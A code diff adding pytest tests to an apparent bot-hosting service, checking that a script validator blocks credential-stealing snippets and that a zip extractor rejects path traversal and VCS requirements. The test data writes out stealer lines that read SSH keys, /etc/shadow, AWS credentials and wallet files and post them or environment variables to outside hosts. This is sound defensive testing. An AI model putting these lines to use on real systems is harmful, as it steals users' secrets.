@@ -184,4 +184,78 @@ def test_validator(source: bytes, ok: bool) -> None:
 def test_validator_warns_on_eval() -> None:
     result = validate_user_script(b"eval('1+1')\n")
     assert result.ok
+    assert result.warnings is not None
     assert any("eval" in w for w in result.warnings)
+
+
+@pytest.mark.parametrize(
+    "snippet",
+    [
+        b"open(os.path.expanduser('~/.ssh/id_rsa')).read()\n",
+        b"requests.get('http://x', data=open('/etc/shadow').read())\n",
+        b"shutil.copy(p, 'wallet.dat')\n",
+        b"with open(BASE/'.aws/credentials') as f: data = f.read()\n",
+        b"subprocess.run(['curl', 'http://evil'])\n",
+    ],
+)
+def test_validator_blocks_stealer_patterns(snippet: bytes) -> None:
+    result = validate_user_script(snippet)
+    assert not result.ok, snippet
+    assert result.error is not None
+
+
+def test_validator_blocks_env_dump() -> None:
+    src = b"requests.post('http://x', data=os.environ.copy())\n"
+    result = validate_user_script(src)
+    assert not result.ok
+
+
+def test_bundle_extract_minimal_zip(tmp_path: Path) -> None:
+    import io
+    import zipfile
+
+    from bothost.bundle import extract_zip
+
+    buf = io.BytesIO()
+    with zipfile.ZipFile(buf, "w") as zf:
+        zf.writestr("bot.py", b"print('hi')\n")
+        zf.writestr("requirements.txt", b"requests==2.32.3\n")
+
+    target = tmp_path / "extracted"
+    result = asyncio.run(extract_zip(archive_bytes=buf.getvalue(), target_dir=target))
+    assert result.ok, result.error
+    assert (target / "bot.py").exists()
+    assert result.requirements == ["requests==2.32.3"]
+
+
+def test_bundle_rejects_path_traversal(tmp_path: Path) -> None:
+    import io
+    import zipfile
+
+    from bothost.bundle import extract_zip
+
+    buf = io.BytesIO()
+    with zipfile.ZipFile(buf, "w") as zf:
+        zf.writestr("../evil.py", b"x")
+    result = asyncio.run(
+        extract_zip(archive_bytes=buf.getvalue(), target_dir=tmp_path / "x")
+    )
+    assert not result.ok
+    assert result.error is not None and ".." in result.error or "путь" in (result.error or "").lower()
+
+
+def test_bundle_rejects_vcs_requirement(tmp_path: Path) -> None:
+    import io
+    import zipfile
+
+    from bothost.bundle import extract_zip
+
+    buf = io.BytesIO()
+    with zipfile.ZipFile(buf, "w") as zf:
+        zf.writestr("bot.py", b"print('hi')\n")
+        zf.writestr("requirements.txt", b"git+https://github.com/x/y.git\n")
+    result = asyncio.run(
+        extract_zip(archive_bytes=buf.getvalue(), target_dir=tmp_path / "y")
+    )
+    assert not result.ok
+    assert "VCS" in (result.error or "")
